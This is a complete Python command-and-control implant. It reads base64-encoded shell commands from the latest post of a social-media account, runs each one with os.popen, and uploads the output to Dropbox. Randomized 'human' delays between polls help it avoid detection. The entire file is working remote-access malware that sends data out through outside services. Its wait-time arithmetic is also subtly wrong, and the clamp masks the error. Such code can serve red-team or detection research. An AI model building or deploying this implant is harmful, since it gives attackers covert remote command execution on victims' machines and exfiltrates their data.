#!/usr/bin/python3

import sys
import toml
import requests
import json
import base64
import random 
import dropbox
import time
import os

def get_config():
    # Print status
    print("[*] Getting configuration settings from config file")

    # Define the server, user_id, impID and dropbox_token as a global variable
    global server, user_id, dropbox_token, impID

    # Load the config file
    config = toml.load("config.toml")

    # Get the server from the config file
    server = config["server"]

    # Get the user_id from the config file
    user_id = config["user_id"]

    # Get dropbox token from the config file
    dropbox_token = config["dropbox_token"]

    # impID is an argument passed to the implant, if it's not passed, generate a random one
    if len(sys.argv) > 1:
        impID = sys.argv[1]
    else:
        print("[*] No implant ID passed, generating random one...")
        
        # Generate a random implant ID
        impID = "00000001"
        # impID = base64.b64encode(os.urandom(8)).decode("utf-8")

        print("[*] Implant ID: " + impID)

def get_latest_command():
    api_endpoint = f'/api/v1/accounts/{user_id}/statuses'

    headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Content-Type': 'application/json'
    }

    try:
        response = requests.get(f"{server}{api_endpoint}", params={"exclude_replies": "true"}, headers=headers)

        # Parse the API response
        response_data = json.loads(response.text)

        # Extract the most recent status from the response
        most_recent_status = response_data[0].get('content')[3:-4]
    
        # Decode command
        command = base64.b64decode(most_recent_status).decode("utf-8")

        # Return the command
        return command

    except:
        # Print status
        print("[*] Couldn't get latest command")

        return None

def wait_human_rand():
    # Generate a random number with a normal distribution centered around 120 seconds
    # with a standard deviation of 30 seconds
    wait_time = random.normalvariate(120, 30)

    # Shift the distribution to the desired range (60 to 180 seconds)
    wait_time = (wait_time * 120) + 60

    # Ensure that the value is within the desired range
    wait_time = max(60, min(wait_time, 180))

    # Sleep for the chosen number of seconds
    time.sleep(wait_time)

def execute_command(command):
    # Print status
    print("[*] Executing command...")

    # Execute the command
    output = os.popen(command).read()

    # Print status
    print("[*] Command executed")

    # Return the output
    return output

def upload_output(output):
    # Print status
    print("[*] Uploading output to dropbox...")

    try:
        # Upload the output
        dbx = dropbox.Dropbox(dropbox_token)

        # Encode the output
        output = output.encode("utf-8")

        # Upload the output to dropbox, if the file already exists, overwrite it
        dbx.files_upload(output, f"/output/{impID}_output.txt", mode=dropbox.files.WriteMode.overwrite)

        # Print status
        print("[*] Output uploaded")

    except:
        # Print status
        print("[*] Couldn't upload output to dropbox")
        exit()

def listen():
    # Print status
    print("[*] Getting first command...")

    # Get the first command
    command = get_latest_command()

    if not command:
        print("[*] Bye")
        exit()

    # Wait some human random time
    wait_human_rand()

    # Print status
    print("[*] Listening for commands...")

    # Loop forever to listen for commands
    while True:
        # Get the latest command
        latest_command = get_latest_command()

        # Check if the command is different
        if latest_command != command:
            # Print status
            print("[*] New command received")

            # Execute the command
            output = execute_command(latest_command)

            # Upload the output
            upload_output(output)

            # Set the command to the latest command
            command = latest_command

            # Print Status
            print("[*] Listening for commands...")
        
        # Wait some human random time
        wait_human_rand()

# Main function
def main():
    # Get the credentials
    get_config()

    # Listen for commands
    try:
        listen()
    # on keyboard interrupt
    except KeyboardInterrupt:
        # Print status
        print("[*] Keyboard interrupt detected, exiting...")

# Run the main function
if __name__ == "__main__":
    main()